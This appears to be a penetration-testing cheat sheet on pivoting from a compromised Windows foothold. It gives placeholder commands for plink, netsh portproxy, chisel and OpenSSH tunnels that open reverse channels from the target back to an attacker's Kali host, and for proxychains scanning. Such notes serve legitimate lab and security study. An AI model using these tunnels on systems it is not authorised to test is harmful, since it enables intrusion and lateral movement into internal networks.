# Windows pivots and proxy checks

## Reachability from the foothold
```powershell
Test-NetConnection -ComputerName <IP> -Port 445
Test-NetConnection -ComputerName <IP> -Port 3389
```

## Forward one TCP port
Plink (Windows SSHes to Kali; internal service appears on Kali loopback):
```cmd
plink.exe -ssh -l <USER> -pw <PW> -R 127.0.0.1:3389:<IP>:3389 <KALI>
```
`netsh portproxy` (admin + IP Helper; listens on the pivot):
```cmd
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=3389 connectaddress=<IP> connectport=3389
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=3389
```
- `<USER>`/`<PW>` for plink = an SSH account on Kali.
- The last line removes the rule.

## chisel.exe (reverse SOCKS from Windows)
```cmd
chisel.exe client <KALI>:<PORT> R:1080:socks
```
- Same tool, same flags as the Linux foothold case: [chisel-ligolo](chisel-ligolo.md#chisel-reverse-socks). Cross-compile for the target's exact Windows arch (`x86_64` → `GOARCH=amd64`) the same way as the FreeBSD example there.
```cmd
chisel.exe client <KALI>:<PORT> R:3389:<IP>:3389
```
- Single internal service instead of a full SOCKS proxy — same pattern as the Linux `R:<port>:<ip>:<port>` form.

## Built-in Windows OpenSSH (no extra binary)
Windows 10 1809+ / Server 2019+ ship an OpenSSH client at `C:\Windows\System32\OpenSSH\ssh.exe` — same flags as Linux `ssh`:
```cmd
ssh.exe -R 1080 <USER>@<KALI>
ssh.exe -D 1080 <USER>@<KALI>
```
- `-R 1080`: remote port forward — opens `1080` on Kali, tunneled back to localhost on the Windows box (pair with `-N` to skip a remote shell if the account allows it).
- `-D 1080`: dynamic SOCKS proxy *from* the Windows box's perspective — only useful if Kali has a reason to tunnel traffic back out through Windows, not the usual pivot direction. For routing Kali traffic into the Windows box's network, `-R` (to a listening SOCKS/relay on Kali) or chisel above is the right tool.
- `where ssh` / `Test-Path C:\Windows\System32\OpenSSH\ssh.exe` confirms it's actually present — older builds and Server Core may not have it.

## Proxychains
```bash
proxychains nmap -sT -Pn -p 445 <IP>
```
- IP works but name fails → DNS / `proxy_dns`.

### Speed
```text
# /etc/proxychains4.conf
quiet_mode
tcp_read_time_out 15000
tcp_connect_time_out 8000
```
- `quiet_mode`: drops the per-connection noise, useful once the route is confirmed working.
- `tcp_connect_time_out` / `tcp_read_time_out` (ms): lower both to fail dead hosts faster on a large scan; raise `tcp_read_time_out` if a slow link is timing out otherwise-working connections.
